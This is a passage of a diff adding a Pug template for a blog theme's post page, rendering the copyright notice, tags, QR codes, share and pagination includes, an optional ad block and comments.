+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
